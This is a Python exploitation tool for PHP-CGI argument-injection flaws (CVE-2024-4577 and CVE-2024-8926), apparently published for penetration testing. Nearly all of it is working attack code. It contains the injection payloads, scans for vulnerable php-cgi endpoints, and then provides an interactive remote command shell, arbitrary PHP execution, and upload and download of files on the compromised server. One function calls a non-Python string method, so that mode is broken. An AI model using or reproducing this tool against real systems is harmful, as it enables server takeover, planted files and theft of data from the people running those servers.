import requests
import base64
import sys
import os
import urllib3
import chardet
from urllib.parse import urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Global Settings
DEFAULT_TIMEOUT = 10
MIN_TIMEOUT = 1
MAX_TIMEOUT = 120
timeout_value = DEFAULT_TIMEOUT
enable_log = "--log" in sys.argv

PAYLOADS = {
    "CVE-2024-4577": "%ADd+disable_functions%3d%26+%ADd+disable_classes%3d%26+%ADd+open_basedir%3d+%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+allow_url_fopen%3d1+%ADd+auto_prepend_file%3dphp://input",
    "CVE-2024-8926": "%a8-d%a8+disable_functions%3d%26+%a8-d%a8+disable_classes%3d%26+%a8-d%a8+open_basedir%3d+%a8-d%a8+cgi.force_redirect%3d0+%a8-d%a8+cgi.redirect_status_env+%a8-d%a8+allow_url_include%3d1+%a8-d%a8+allow_url_fopen%3d1+%a8-d%a8+auto_prepend_file%3dphp://input"
}

def show_banner():
    banner = r"""
 ██████╗ ██╗  ██╗██████╗                     ██████╗ ██████╗ ██╗
 ██╔══██╗██║  ██║██╔══██╗  ▌ ╠═╦╤╤╤╤╤╤╗     ██╔════╝██╔════╝ ██║
 ██████╔╝███████║██████╔╝  ████║███████╠═══ ██║     ██║  ███╗██║
 ██╔═══╝ ██╔══██║██╔═══╝   ▌ ╠═╩╧╧╧╧╧╧╝     ██║     ██║   ██║██║
 ██║     ██║  ██║██║                        ╚██████╗╚██████╔╝██║
 ╚═╝     ╚═╝  ╚═╝╚═╝                         ╚═════╝ ╚═════╝ ╚═╝
 ██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗ ██████╗ ██████╗ 
 ██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗
 ██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║   ██║██████╔╝
 ██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║   ██║██╔══██╗
 ██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ╚██████╔╝██║  ██║
 ╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
                                                              
[*] CVE-2024-4577 & CVE-2024-8926 Exploitation Tool
[*] Version: 1.0
[*] Author: Night-have-dreams
[*] This is a testing tool for PHP-CGI parameter injection vulnerabilities
[*] For lawful security testing only, do not use on unauthorized systems!
[*] Users should assume the risks associated with the use of this tool
"""
    print(banner)
    
def decode_response(response):
    detected = chardet.detect(response.content)
    encoding = detected.get('encoding')
    if encoding:
        return response.content.decode(encoding, errors='replace')
    return response.content.decode('utf-8', errors='replace')

def send_request(url, data, timeout=None):
    try:
        response = requests.post(url, data=data, verify=False, timeout=timeout)
        decoded_text = decode_response(response)  # Add automatic encoding detection
        return decoded_text
    except Exception as e:
        print(f"[!] Request error: {e}")
        return None

def choose_endpoint(url, payload_key):
    endpoints = [
        "/php-cgi/php-cgi.exe", "/cgi-bin/php-cgi.exe",
        "/php-cgi.exe", "/cgi/php-cgi.exe", "/php.exe",
        "/cgi-bin/php.exe", "/cgi/php.exe",
        "/index.php", "/"
    ]
    test_payload = "<?php echo 'TEST_VULNTEST_CVE-2024-4577'; die(); ?>"
    for ep in endpoints:
        target_url = f"{url}{ep}?{PAYLOADS[payload_key]}"
        resp = send_request(target_url, test_payload, timeout_value)
        if resp and 'TEST_VULNTEST_CVE-2024-4577' in resp:
            print(f"[+] Vulnerable entry point found: {ep} (Vulnerability: {payload_key})")
            return ep
    print(f"[-] Vulnerability not found (CVE: {payload_key})")
    return None

def get_unique_filepath(directory, filename):
    base, ext = os.path.splitext(filename)
    candidate = os.path.join(directory, filename)
    i = 1
    while os.path.exists(candidate):
        candidate = os.path.join(directory, f"{base}_{i}{ext}")
        i += 1
    return candidate

def exploit_shell(url, endpoint, payload_key):
    print("[*] Enter command, type 'exit' to end, use '--save [path]' to save single output:")
    host = urlparse(url).netloc
    log_path = os.path.join("log", f"{host}.log") if enable_log else None
    if enable_log and not os.path.exists("log"):
        os.makedirs("log")

    while True:
        cmd = input("shell> ").strip()
        if cmd.lower() == "exit":
            break
        parts = cmd.split("--save")
        real_cmd = parts[0].strip()
        save_path = parts[1].strip() if len(parts) > 1 else None

        if save_path == "":
            save_dir = os.path.join(os.getcwd(), "output")
            if not os.path.exists(save_dir):
                os.makedirs(save_dir)
            save_path = os.path.join(save_dir, f"{real_cmd.replace(' ', '_')}.txt")
        
        payload = f"<?php system('{real_cmd}'); die(); ?>"
        target_url = f"{url}{endpoint}?{PAYLOADS[payload_key]}"
        
        resp = send_request(target_url, payload, timeout_value)
        output = resp.strip() if resp else ""

        print(output)

        if save_path:
            save_path = os.path.abspath(save_path)
            if os.path.exists(save_path):
                save_path = get_unique_filepath(os.path.dirname(save_path), os.path.basename(save_path))
            with open(save_path, "w", encoding="utf-8") as f:
                f.write(output)
            print(f"[+] Output saved to {save_path}")

        if enable_log:
            with open(log_path, "a", encoding="utf-8") as f:
                f.write(f"CMD: {real_cmd}\n{output}\n{'-'*20}\n")

def custom_php_mode(url, endpoint, payload_key):
    print("[*] Enter PHP code, type 'EOF' to end, use '--save [path]' to save output:")
    php_code = ""
    save_path = None
    while True:
        line = input()
        if line.strip().startsWith("EOF"):
            parts = line.split("--save")
            if len(parts) > 1:
                save_path = parts[1].strip()
                if save_path == "":
                    save_dir = os.path.join(os.getcwd(), "output")
                    if not os.path.exists(save_dir):
                        os.makedirs(save_dir)
                    save_path = os.path.join(save_dir, "php_output.txt")
            break
        php_code += line + "\n"

    payload = f"<?php {php_code}; die(); ?>"
    target_url = f"{url}{endpoint}?{PAYLOADS[payload_key]}"
    resp = send_request(target_url, payload, timeout_value)
    output = resp.strip() if resp else ""

    print(output)

    if save_path:
        save_path = os.path.abspath(save_path)
        if os.path.exists(save_path):
            save_path = get_unique_filepath(os.path.dirname(save_path), os.path.basename(save_path))
        with open(save_path, "w", encoding="utf-8") as f:
            f.write(output)
        print(f"[+] PHP output results saved to {save_path}")

def get_remote_docroot(url, endpoint, payload_key):
    payload = "<?php echo $_SERVER['DOCUMENT_ROOT']; die(); ?>"
    target_url = f"{url}{endpoint}?{PAYLOADS[payload_key]}"
    resp = send_request(target_url, payload, timeout_value)
    return resp.strip() if resp else None

def upload_file(url, endpoint, payload_key):
    local = input("Local file path:").strip()
    remote = input("Target full path (if blank, will upload to website root directory):").strip()
    
    if remote == "":
        docroot = get_remote_docroot(url, endpoint, payload_key)
        if not docroot:
            print("[!] Unable to get the website root directory, please manually specify the full path")
            return
        remote = os.path.join(docroot, os.path.basename(local))
        remote = remote.replace("\\", "/")
        print(f"[*] Upload path set automatically to: {remote}")

    try:
        with open(local, "rb") as f:
            encoded = base64.b64encode(f.read()).decode()
    except Exception as e:
        print(f"[!] Failed to read local file: {e}")
        return
    
    payload = f"<?php file_put_contents('{remote}', base64_decode('{encoded}')); echo 'OK'; die(); ?>"
    resp = send_request(f"{url}{endpoint}?{PAYLOADS[payload_key]}", payload)

    print(resp.strip() if resp else "[!] Upload failed, no response")

def download_file(url, endpoint, payload_key):
    remote = input("Remote file path:").strip()
    local = os.path.join("download", os.path.basename(remote))
    if not os.path.exists("download"):
        os.makedirs("download")
    payload = f"<?php echo base64_encode(file_get_contents('{remote}')); die(); ?>"
    resp = send_request(f"{url}{endpoint}?{PAYLOADS[payload_key]}", payload)
    if resp:
        with open(local, "wb") as f:
            f.write(base64.b64decode(resp.strip()))
        print(f"Downloaded to {local}")

if __name__ == "__main__":
    show_banner()
    if len(sys.argv) < 3 or sys.argv[1] != "-u":
        print("Usage: python exploit.py -u <URL> [--timeout=seconds] [--log]")
        sys.exit(1)

    target = sys.argv[2]

    # Timeout logic
    timeout_value = DEFAULT_TIMEOUT  # Default is 10 seconds
    for arg in sys.argv:
        if arg.startswith("--timeout="):
            timeout_str = arg.split("=")[1]
            if not timeout_str.isdigit():
                print("[!] Incorrect timeout setting, please enter 0 or a positive integer")
                sys.exit(1)
            timeout_int = int(timeout_str)
            if timeout_int == 0:
                timeout_value = None  # Wait indefinitely
                print("[*] Set to wait indefinitely")
            elif timeout_int > MAX_TIMEOUT:
                print(f"[!] Waiting time too long (exceeds the maximum {MAX_TIMEOUT} seconds), use --timeout=0 for indefinite waiting")
                sys.exit(1)
            elif timeout_int > 30:
                print("[!] Warning: timeout exceeds 30 seconds, testing may take longer")
                timeout_value = timeout_int
            else:
                timeout_value = timeout_int
                print(f"[*] Request timeout set to {timeout_value} seconds")

    while True:
        selected_endpoint, selected_payload = None, None
        print("[*] Starting tests...")
        for p in PAYLOADS:
            ep = choose_endpoint(target, p)
            if ep:
                selected_endpoint, selected_payload = ep, p
                break
        if not selected_endpoint:
            print("[-] No vulnerabilities found, please specify a new target or exit")

        while selected_endpoint:
            print(f"\n[*] Current target: {target} (Vulnerability: {selected_payload})")
            print("Choose mode:")
            print("1) Shell mode (execute commands using system())")
            print("2) Custom PHP mode (execute arbitrary code using eval())")
            print("3) Upload file")
            print("4) Download file")
            print("5) Switch attack target")
            print("6) Exit program")

            choice = input(">> ").strip()
            if choice == "1":
                exploit_shell(target, selected_endpoint, selected_payload)
            elif choice == "2":
                custom_php_mode(target, selected_endpoint, selected_payload)
            elif choice == "3":
                upload_file(target, selected_endpoint, selected_payload)
            elif choice == "4":
                download_file(target, selected_endpoint, selected_payload)
            elif choice == "5":
                target = input("Enter new target URL: ").strip()
                break
            elif choice == "6":
                print("[*] Program ending")
                sys.exit(0)
            else:
                print("[!] Invalid selection, please choose again")

        if not selected_endpoint:
            next_action = input("1) Re-enter target  2) Exit\n>> ").strip()
            if next_action == "1":
                target = input("Enter new target URL: ").strip()
            else:
                print("[*] Program ending")
                sys.exit(0)
